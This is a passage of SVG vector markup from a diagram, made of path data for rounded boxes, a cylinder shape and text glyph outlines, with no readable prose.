-1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm12.859375 -11.03125l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm5.3164062 0l0 -12.453125l1.90625 0l0 1.78125q1.375 -2.0625 3.953125 -2.0625q1.125 0 2.0625 0.40625q0.953125 0.40625 1.421875 1.0625q0.46875 0.65625 0.65625 1.5625q0.125 0.578125 0.125 2.046875l0 7.65625l-2.109375 0l0 -7.578125q0 -1.28125 -0.25 -1.921875q-0.25 -0.640625 -0.875 -1.015625q-0.625 -0.390625 -1.46875 -0.390625q-1.34375 0 -2.328125 0.859375q-0.984375 0.859375 -0.984375 3.25l0 6.796875l-2.109375 0zm12.972656 1.03125l2.046875 0.3125q0.125 0.9375 0.71875 1.375q0.78125 0.59375 2.140625 0.59375q1.46875 0 2.265625 -0.59375q0.796875 -0.578125 1.078125 -1.640625q0.15625 -0.640625 0.140625 -2.703125q-1.375 1.625 -3.4375 1.625q-2.5625 0 -3.96875 -1.84375q-1.40625 -1.859375 -1.40625 -4.453125q0 -1.78125 0.640625 -3.28125q0.640625 -1.515625 1.859375 -2.328125q1.234375 -0.828125 2.890625 -0.828125q2.203125 0 3.625 1.78125l0 -1.5l1.953125 0l0 10.765625q0 2.90625 -0.59375 4.109375q-0.59375 1.21875 -1.875 1.921875q-1.28125 0.703125 -3.15625 0.703125q-2.234375 0 -3.609375 -1.0q-1.359375 -1.0 -1.3125 -3.015625zm1.734375 -7.484375q0 2.453125 0.96875 3.578125q0.984375 1.125 2.453125 1.125q1.453125 0 2.4375 -1.109375q0.984375 -1.125 0.984375 -3.515625q0 -2.28125 -1.015625 -3.4375q-1.015625 -1.171875 -2.453125 -1.171875q-1.40625 0 -2.390625 1.140625q-0.984375 1.140625 -0.984375 3.390625z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m85.26546 238.26848l2.140625 -0.1875q0.15625 1.28125 0.703125 2.109375q0.5625 0.828125 1.734375 1.34375q1.171875 0.5 2.640625 0.5q1.296875 0 2.296875 -0.375q1.0 -0.390625 1.484375 -1.0625q0.484375 -0.6875 0.484375 -1.484375q0 -0.796875 -0.46875 -1.40625q-0.46875 -0.609375 -1.546875 -1.015625q-0.6875 -0.265625 -3.0625 -0.828125q-2.359375 -0.578125 -3.3125 -1.078125q-1.234375 -0.640625 -1.84375 -1.59375q-0.59375 -0.96875 -0.59375 -2.140625q0 -1.3125 0.734375 -2.4375q0.75 -1.125 2.15625 -1.703125q1.421875 -0.59375 3.15625 -0.59375q1.90625 0 3.359375 0.609375q1.46875 0.609375 2.25 1.8125q0.796875 1.1875 0.84375 2.703125l-2.171875 0.171875q-0.171875 -1.640625 -1.1875 -2.46875q-1.015625 -0.828125 -3.0 -0.828125q-2.0625 0 -3.015625 0.765625q-0.9375 0.75 -0.9375 1.8125q0 0.921875 0.671875 1.515625q0.65625 0.609375 3.421875 1.234375q2.78125 0.625 3.8125 1.09375q1.5 0.6875 2.203125 1.75q0.71875 1.0625 0.71875 2.4375q0 1.375 -0.78125 2.59375q-0.78125 1.203125 -2.25 1.890625q-1.46875 0.671875 -3.3125 0.671875q-2.328125 0 -3.90625 -0.671875q-1.578125 -0.6875 -2.484375 -2.046875q-0.890625 -1.375 -0.9375 -3.09375zm16.414062 10.3125l-0.234375 -1.984375q0.703125 0.1875 1.21875 0.1875q0.703125 0 1.125 -0.234375q0.421875 -0.234375 0.6875 -0.65625q0.203125 -0.3125 0.640625 -1.5625q0.0625 -0.1875 0.1875 -0.515625l-4.71875 -12.484375l2.265625 0l2.59375 7.21875q0.5 1.359375 0.90625 2.875q0.359375 -1.453125 0.859375 -2.828125l2.671875 -7.265625l2.109375 0l-4.734375 12.671875q-0.765625 2.046875 -1.1875 2.8125q-0.5625 1.046875 -1.296875 1.53125q-0.71875 0.484375 -1.734375 0.484375q-0.609375 0 -1.359375 -0.25zm11.25 -8.515625l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 -1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm12.84375 3.71875l0 -12.453125l1.890625 0l0 1.75q0.59375 -0.90625 1.5625 -1.46875q0.96875 -0.5625 2.21875 -0.5625q1.375 0 2.25 0.578125q0.890625 0.578125 1.265625 1.609375q1.46875 -2.1875 3.84375 -2.1875q1.84375 0 2.84375 1.03125q1.0 1.03125 1.0 3.15625l0 8.546875l-2.109375 0l0 -7.84375q0 -1.265625 -0.203125 -1.8125q-0.203125 -0.5625 -0.75 -0.90625q-0.53125 -0.34375 -1.25 -0.34375q-1.3125 0 -2.1875 0.875q-0.859375 0.875 -0.859375 2.796875l0 7.234375l-2.109375 0l0 -8.09375q0 -1.40625 -0.515625 -2.109375q-0.515625 -0.703125 -1.6875 -0.703125q-0.890625 0 -1.65625 0.46875q-0.75 0.46875 -1.09375 1.375q-0.34375 0.90625 -0.34375 2.609375l0 6.453125l-2.109375 0zm19.210938 -6.21875q0 -3.46875 1.921875 -5.125q1.609375 -1.390625 3.921875 -1.390625q2.5625 0 4.1875 1.6875q1.625 1.6875 1.625 4.640625q0 2.40625 -0.71875 3.78125q-0.71875 1.375 -2.09375 2.140625q-1.375 0.765625 -3.0 0.765625q-2.625 0 -4.234375 -1.671875q-1.609375 -1.6875 -1.609375 -4.828125zm2.171875 0q0 2.390625 1.03125 3.578125q1.046875 1.1875 2.640625 1.1875q1.5625 0 2.609375 -1.1875q1.046875 -1.203125 1.046875 -3.65625q0 -2.3125 -1.0625 -3.5q-1.046875 -1.1875 -2.59375 -1.1875q-1.59375 0 -2.640625 1.1875q-1.03125 1.1875 -1.03125 3.578125zm11.957031 6.21875l0 -12.453125l1.90625 0l0 1.78125q1.375 -2.0625 3.953125 -2.0625q1.125 0 2.0625 0.40625q0.953125 0.40625 1.421875 1.0625q0.46875 0.65625 0.65625 1.5625q0.125 0.578125 0.125 2.046875l0 7.65625l-2.109375 0l0 -7.578125q0 -1.28125 -0.25 -1.921875q-0.25 -0.640625 -0.875 -1.015625q-0.625 -0.390625 -1.46875 -0.390625q-1.34375 0 -2.328125 0.859375q-0.984375 0.859375 -0.984375 3.25l0 6.796875l-2.109375 0z" fill-rule="nonzero"/>&lt;path fill="#cfe2f3" d="m68.908134 315.3679l0 0c0 -11.8403015 9.598457 -21.438751 21.438751 -21.438751l246.19336 0c5.685913 0 11.138947 2.258728 15.159485 6.2792664c4.0205383 4.0205383 6.2792664 9.473572 6.2792664 15.159485l0 85.75241c0 11.8403015 -9.59845 21.438751 -21.438751 21.438751l-246.19336 0l0 0c-11.840294 0 -21.438751 -9.59845 -21.438751 -21.438751z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m68.908134 315.3679l0 0c0 -11.8403015 9.598457 -21.438751 21.438751 -21.438751l246.19336 0c5.685913 0 11.138947 2.258728 15.159485 6.2792664c4.0205383 4.0205383 6.2792664 9.473572 6.2792664 15.159485l0 85.75241c0 11.8403015 -9.59845 21.438751 -21.438751 21.438751l-246.19336 0l0 0c-11.840294 0 -21.438751 -9.59845 -21.438751 -21.438751z" fill-rule="evenodd"/>&lt;path fill="#000000" d="m86.04671 352.2841l0 -17.1875l6.46875 0q1.71875 0 2.625 0.171875q1.265625 0.203125 2.109375 0.796875q0.859375 0.59375 1.375 1.671875q0.53125 1.0625 0.53125 2.328125q0 2.203125 -1.40625 3.71875q-1.390625 1.515625 -5.03125 1.515625l-4.40625 0l0 6.984375l-2.265625 0zm2.265625 -9.015625l4.4375 0q2.203125 0 3.125 -0.8125q0.9375 -0.828125 0.9375 -2.3125q0 -1.078125 -0.546875 -1.84375q-0.546875 -0.765625 -1.4375 -1.015625q-0.578125 -0.15625 -2.125 -0.15625l-4.390625 0l0 6.140625zm21.992188 5.0l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm11.738281 7.421875l0 -12.453125l1.890625 0l0 1.890625q0.734375 -1.328125 1.34375 -1.75q0.625 -0.421875 1.359375 -0.421875q1.0625 0 2.171875 0.6875l-0.734375 1.953125q-0.765625 -0.453125 -1.546875 -0.453125q-0.6875 0 -1.25 0.421875q-0.546875 0.40625 -0.78125 1.140625q-0.34375 1.125 -0.34375 2.46875l0 6.515625l-2.109375 0zm8.0234375 -14.75l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm4.5351562 -6.21875q0 -3.46875 1.921875 -5.125q1.609375 -1.390625 3.921875 -1.390625q2.5625 0 4.1875 1.6875q1.625 1.6875 1.625 4.640625q0 2.40625 -0.71875 3.78125q-0.71875 1.375 -2.09375 2.140625q-1.375 0.765625 -3.0 0.765625q-2.625 0 -4.234375 -1.671875q-1.609375 -1.6875 -1.609375 -4.828125zm2.171875 0q0 2.390625 1.03125 3.578125q1.046875 1.1875 2.640625 1.1875q1.5625 0 2.609375 -1.1875q1.046875 -1.203125 1.046875 -3.65625q0 -2.3125 -1.0625 -3.5q-1.046875 -1.1875 -2.59375 -1.1875q-1.59375 0 -2.640625 1.1875q-1.03125 1.1875 -1.03125 3.578125zm20.035156 6.21875l0 -1.578125q-1.1875 1.859375 -3.484375 1.859375q-1.484375 0 -2.734375 -0.8125q-1.25 -0.828125 -1.9375 -2.296875q-0.671875 -1.46875 -0.671875 -3.390625q0 -1.859375 0.609375 -3.375q0.625 -1.515625 1.859375 -2.328125q1.25 -0.8125 2.78125 -0.8125q1.125 0 2.0 0.484375q0.890625 0.46875 1.4375 1.234375l0 -6.171875l2.09375 0l0 17.1875l-1.953125 0zm-6.671875 -6.21875q0 2.390625 1.0 3.578125q1.015625 1.1875 2.390625 1.1875q1.390625 0 2.34375 -1.125q0.96875 -1.140625 0.96875 -3.453125q0 -2.5625 -0.984375 -3.75q-0.984375 -1.203125 -2.421875 -1.203125q-1.40625 0 -2.359375 1.15625q-0.9375 1.140625 -0.9375 3.609375zm11.957031 -8.53125l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm13.441406 -4.5625l2.078125 0.265625q-0.34375 2.15625 -1.75 3.375q-1.390625 1.203125 -3.4375 1.203125q-2.546875 0 -4.109375 -1.671875q-1.546875 -1.671875 -1.546875 -4.78125q0 -2.015625 0.671875 -3.53125q0.671875 -1.515625 2.03125 -2.265625q1.359375 -0.765625 2.96875 -0.765625q2.03125 0 3.3125 1.03125q1.296875 1.03125 1.65625 2.90625l-2.046875 0.328125q-0.296875 -1.265625 -1.046875 -1.890625q-0.734375 -0.640625 -1.796875 -0.640625q-1.59375 0 -2.59375 1.15625q-0.984375 1.140625 -0.984375 3.609375q0 2.5 0.953125 3.640625q0.96875 1.140625 2.515625 1.140625q1.234375 0 2.0625 -0.765625q0.84375 -0.765625 1.0625 -2.34375zm10.527344 4.5625l0 -12.453125l1.890625 0l0 1.890625q0.734375 -1.328125 1.34375 -1.75q0.625 -0.421875 1.359375 -0.421875q1.0625 0 2.171875 0.6875l-0.734375 1.953125q-0.765625 -0.453125 -1.546875 -0.453125q-0.6875 0 -1.25 0.421875q-0.546875 0.40625 -0.78125 1.140625q-0.34375 1.125 -0.34375 2.46875l0 6.515625l-2.109375 0zm16.539062 -4.015625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm12.269531 7.421875l0 -10.8125l-1.875 0l0 -1.640625l1.875 0l0 -1.3125q0 -1.265625 0.21875 -1.875q0.296875 -0.8125 1.0625 -1.3125q0.78125 -0.515625 2.15625 -0.515625q0.890625 0 1.96875 0.203125l-0.3125 1.84375q-0.65625 -0.125 -1.25 -0.125q-0.953125 0 -1.359375 0.421875q-0.390625 0.40625 -0.390625 1.53125l0 1.140625l2.421875 0l0 1.640625l-2.421875 0l0 10.8125l-2.09375 0zm6.1367188 0l0 -12.453125l1.890625 0l0 1.890625q0.734375 -1.328125 1.34375 -1.75q0.625 -0.421875 1.359375 -0.421875q1.0625 0 2.171875 0.6875l-0.734375 1.953125q-0.765625 -0.453125 -1.546875 -0.453125q-0.6875 0 -1.25 0.421875q-0.546875 0.40625 -0.78125 1.140625q-0.34375 1.125 -0.34375 2.46875l0 6.515625l-2.109375 0zm16.539062 -4.015625l2.171875 0.28125q-0.515625 1.90625 -1.90625 2.96875q-1.390625 1.046875 -3.5625 1.046875q-2.734375 0 -4.34375 -1.671875q-1.59375 -1.6875 -1.59375 -4.734375q0 -3.140625 1.609375 -4.875q1.625 -1.734375 4.203125 -1.734375q2.5 0 4.078125 1.703125q1.59375 1.703125 1.59375 4.78125q0 0.1875 -0.015625 0.5625l-9.28125 0q0.109375 2.046875 1.15625 3.140625q1.046875 1.09375 2.609375 1.09375q1.15625 0 1.96875 -0.609375q0.828125 -0.609375 1.3125 -1.953125zm-6.9375 -3.40625l6.953125 0q-0.140625 -1.5625 -0.796875 -2.359375q-1.0 -1.21875 -2.609375 -1.21875q-1.453125 0 -2.453125 0.984375q-0.984375 0.96875 -1.09375 2.59375zm10.910156 3.703125l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 -1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm12.84375 3.71875l0 -17.1875l2.109375 0l0 6.171875q1.484375 -1.71875 3.734375 -1.71875q1.375 0 2.390625 0.546875q1.03125 0.546875 1.46875 1.515625q0.4375 0.953125 0.4375 2.78125l0 7.890625l-2.109375 0l0 -7.890625q0 -1.578125 -0.6875 -2.296875q-0.6875 -0.71875 -1.9375 -0.71875q-0.9375 0 -1.765625 0.484375q-0.828125 0.484375 -1.1875 1.3125q-0.34375 0.828125 -0.34375 2.296875l0 6.8125l-2.109375 0zm21.968735 0l-1.953125 0l0 -17.1875l2.109375 0l0 6.140625q1.328125 -1.6875 3.40625 -1.6875q1.140625 0 2.171875 0.46875q1.03125 0.46875 1.6875 1.3125q0.65625 0.828125 1.03125 2.015625q0.375 1.171875 0.375 2.53125q0 3.1875 -1.578125 4.9375q-1.578125 1.75 -3.796875 1.75q-2.203125 0 -3.453125 -1.84375l0 1.5625zm-0.03125 -6.3125q0 2.234375 0.609375 3.234375q1.0 1.625 2.703125 1.625q1.375 0 2.375 -1.203125q1.015625 -1.203125 1.015625 -3.578125q0 -2.4375 -0.96875 -3.59375q-0.953125 -1.171875 -2.328125 -1.171875q-1.390625 0 -2.40625 1.203125q-1.0 1.203125 -1.0 3.484375zm11.332031 11.109375l-0.234375 -1.984375q0.703125 0.1875 1.21875 0.1875q0.703125 0 1.125 -0.234375q0.421875 -0.234375 0.6875 -0.65625q0.203125 -0.3125 0.640625 -1.5625q0.0625 -0.1875 0.1875 -0.515625l-4.71875 -12.484375l2.265625 0l2.59375 7.21875q0.5 1.359375 0.90625 2.875q0.359375 -1.453125 0.859375 -2.828125l2.671875 -7.265625l2.109375 0l-4.734375 12.671875q-0.765625 2.046875 -1.1875 2.8125q-0.5625 1.046875 -1.296875 1.53125q-0.71875 0.484375 -1.734375 0.484375q-0.609375 0 -1.359375 -0.25zm15.828125 -4.796875l6.59375 -17.1875l2.453125 0l7.03125 17.1875l-2.59375 0l-2.0 -5.203125l-7.1875 0l-1.890625 5.203125l-2.40625 0zm4.953125 -7.0625l5.828125 0l-1.796875 -4.75q-0.8125 -2.171875 -1.21875 -3.5625q-0.328125 1.65625 -0.921875 3.28125l-1.890625 5.03125zm12.9453125 7.0625l0 -17.1875l6.46875 0q1.71875 0 2.625 0.171875q1.265625 0.203125 2.109375 0.796875q0.859375 0.59375 1.375 1.671875q0.53125 1.0625 0.53125 2.328125q0 2.203125 -1.40625 3.71875q-1.390625 1.515625 -5.03125 1.515625l-4.40625 0l0 6.984375l-2.265625 0zm2.265625 -9.015625l4.4375 0q2.203125 0 3.125 -0.8125q0.9375 -0.828125 0.9375 -2.3125q0 -1.078125 -0.546875 -1.84375q-0.546875 -0.765625 -1.4375 -1.015625q-0.578125 -0.15625 -2.125 -0.15625l-4.390625 0l0 6.140625zm14.1171875 9.015625l0 -17.1875l2.28125 0l0 17.1875l-2.28125 0z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m85.76546 386.0497l0 -17.21875l1.921875 0l0 1.625q0.6875 -0.953125 1.53125 -1.421875q0.859375 -0.484375 2.078125 -0.484375q1.59375 0 2.8125 0.828125q1.21875 0.8125 1.84375 2.3125q0.625 1.5 0.625 3.28125q0 1.90625 -0.6875 3.4375q-0.6875 1.53125 -2.0 2.34375q-1.296875 0.8125 -2.734375 0.8125q-1.0625 0 -1.90625 -0.4375q-0.828125 -0.453125 -1.375 -1.140625l0 6.0625l-2.109375 0zm1.921875 -10.921875q0 2.40625 0.96875 3.5625q0.96875 1.140625 2.359375 1.140625q1.40625 0 2.40625 -1.1875q1.0 -1.1875 1.0 -3.6875q0 -2.375 -0.984375 -3.5625q-0.96875 -1.1875 -2.328125 -1.1875q-1.359375 0 -2.390625 1.265625q-1.03125 1.25 -1.03125 3.65625zm10.582031 2.4375l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 -1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm12.796875 3.71875l0 -17.1875l2.109375 0l0 17.1875l-2.109375 0zm5.3945312 -14.75l0 -2.4375l2.109375 0l0 2.4375l-2.109375 0zm0 14.75l0 -12.453125l2.109375 0l0 12.453125l-2.109375 0zm4.4726562 -3.71875l2.09375 -0.328125q0.171875 1.25 0.96875 1.921875q0.8125 0.671875 2.25 0.671875q1.453125 0 2.15625 -0.59375q0.703125 -0.59375 0.703125 -1.390625q0 -0.71875 -0.625 -1.125q-0.421875 -0.28125 -2.15625 -0.71875q-2.3125 -0.578125 -3.21875 -1.0q-0.890625 -0.4375 -1.359375 -1.1875q-0.453125 -0.765625 -0.453125 -1.671875q0 -0.828125 0.375 -1.53125q0.390625 -0.71875 1.046875 -1.1875q0.484375 -0.359375 1.328125 -0.609375q0.859375 -0.265625 1.828125 -0.265625q1.46875 0 2.578125 0.421875q1.109375 0.421875 1.625 1.15625q0.53125 0.71875 0.734375 1.921875l-2.0625 0.28125q-0.140625 -0.96875 -0.8125 -1.5q-0.671875 -0.546875 -1.90625 -0.546875q-1.453125 0 -2.078125 0.484375q-0.625 0.484375 -0.625 1.125q0 0.40625 0.265625 0.734375q0.25 0.34375 0.8125 0.5625q0.3125 0.125 1.859375 0.546875q2.234375 0.59375 3.109375 0.984375q0.890625 0.375 1.390625 1.109375q0.515625 0.71875 0.515625 1.796875q0 1.046875 -0.625 1.984375q-0.609375 0.9375 -1.765625 1.453125q-1.15625 0.5 -2.625 0.5q-2.421875 0 -3.703125 -1.0q-1.265625 -1.015625 -1.625 -3.0zm17.453125 1.828125l0.3125 1.859375q-0.890625 0.203125 -1.59375 0.203125q-1.15625 0 -1.796875 -0.359375q-0.625 -0.375 -0.890625 -0.96875q-0.25 -0.59375 -0.25 -2.484375l0 -7.171875l-1.546875 0l0 -1.640625l1.546875 0l0 -3.078125l2.09375 -1.265625l0 4.34375l2.125 0l0 1.640625l-2.125 0l0 7.28125q0 0.90625 0.109375 1.171875q0.125 0.25 0.375 0.40625q0.25 0.140625 0.71875 0.140625q0.34375 0 0.921875 -0.078125z" fill-rule="nonzero"/>&lt;path fill="#f4cccc" d="m461.3937 188.33946l0 0c0 -23.555939 64.710724 -42.651794 144.53543 -42.651794c79.82471 0 144.5354 19.095856 144.5354 42.651794l0 170.60716c0 23.555939 -64.71069 42.651794 -144.5354 42.651794c-79.82471 0 -144.53543 -19.095856 -144.53543 -42.651794z" fill-rule="evenodd"/>&lt;path fill="#000000" fill-opacity="0.0" d="m750.46454 188.33946l0 0c0 23.555923 -64.71069 42.651794 -144.5354 42.651794c-79.82471 0 -144.53543 -19.095871 -144.53543 -42.651794" fill-rule="evenodd"/>&lt;path fill="#000000" fill-opacity="0.0" d="m461.3937 188.33946l0 0c0 -23.555939 64.710724 -42.651794 144.53543 -42.651794c79.82471 0 144.5354 19.095856 144.5354 42.651794l0 170.60716c0 23.555939 -64.71069 42.651794 -144.5354 42.651794c-79.82471 0 -144.53543 -19.095856 -144.53543 -42.651794z" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m750.46454 188.33946l0 0c0 23.555923 -64.71069 42.651794 -144.5354 42.651794c-79.82471 0 -144.53543 -19.095871 -144.53543 -42.651794" fill-rule="evenodd"/>&lt;path stroke="#000000" stroke-width="1.0" stroke-linejoin="round" stroke-linecap="butt" d="m461.3937 188.33946l0 0c0 -23.555939 64.710724 -42.651794 144.53543 -42.651794c79.82471 0 144.5354 19.095856 144.5354 42.651794l0 170.60716c0 23.555939 -64.71069 42.651794 -144.5354 42.651794c-79.82471 0 -144.53543 -19.095856 -144.53543 -42.651794z" fill-rule="evenodd"/>&lt;path fill="#000000" d="m472.34683 274.28894l0 -18.125l6.84375 0q1.796875 0 2.75 0.171875q1.34375 0.21875 2.234375 0.84375q0.90625 0.625 1.453125 1.75q0.5625 1.125 0.5625 2.46875q0 2.3125 -1.484375 3.921875q-1.46875 1.59375 -5.3125 1.59375l-4.640625 0l0 7.375l-2.40625 0zm2.40625 -9.515625l4.6875 0q2.3125 0 3.28125 -0.859375q0.984375 -0.859375 0.984375 -2.4375q0 -1.140625 -0.578125 -1.953125q-0.5625 -0.8125 -1.5 -1.0625q-0.609375 -0.15625 -2.25 -0.15625l-4.625 0l0 6.46875zm14.174896 9.515625l0 -13.140625l2.0 0l0 2.0q0.78125 -1.40625 1.421875 -1.84375q0.65625 -0.453125 1.4375 -0.453125q1.125 0 2.28125 0.71875l-0.765625 2.078125q-0.8125 -0.484375 -1.640625 -0.484375q-0.71875 0 -1.3125 0.4375q-0.578125 0.4375 -0.828125 1.21875q-0.359375 1.1875 -0.359375 2.59375l0 6.875l-2.234375 0zm7.6376038 -6.5625q0 -3.65625 2.03125 -5.40625q1.6875 -1.46875 4.125 -1.46875q2.703125 0 4.421875 1.78125q1.71875 1.78125 1.71875 4.90625q0 2.53125 -0.765625 3.984375q-0.75 1.453125 -2.203125 2.265625q-1.453125 0.796875 -3.171875 0.796875q-2.765625 0 -4.46875 -1.765625q-1.6875 -1.765625 -1.6875 -5.09375zm2.28125 0q0 2.515625 1.09375 3.78125q1.109375 1.25 2.78125 1.25q1.65625 0 2.75 -1.265625q1.109375 -1.265625 1.109375 -3.84375q0 -2.4375 -1.109375 -3.6875q-1.109375 -1.265625 -2.75 -1.265625q-1.671875 0 -2.78125 1.25q-1.09375 1.25 -1.09375 3.78125zm21.195648 1.75l2.1875 0.28125q-0.34375 2.265625 -1.828125 3.546875q-1.484375 1.28125 -3.625 1.28125q-2.703125 0 -4.34375 -1.765625q-1.6405945 -1.765625 -1.6405945 -5.046875q0 -2.125 0.703125 -3.71875q0.7187195 -1.59375 2.1562195 -2.390625q1.4375 -0.8125 3.125 -0.8125q2.140625 0 3.5 1.09375q1.359375 1.078125 1.75 3.0625l-2.171875 0.34375q-0.296875 -1.328125 -1.09375 -1.984375q-0.78125 -0.671875 -1.890625 -0.671875q-1.6875 0 -2.734375 1.203125q-1.046875 1.203125 -1.046875 3.8125q0 2.640625 1.015625 3.84375q1.015625 1.203125 2.640625 1.203125q1.3125 0 2.1875 -0.796875q0.875 -0.8125 1.109375 -2.484375zm13.0859375 0.578125l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 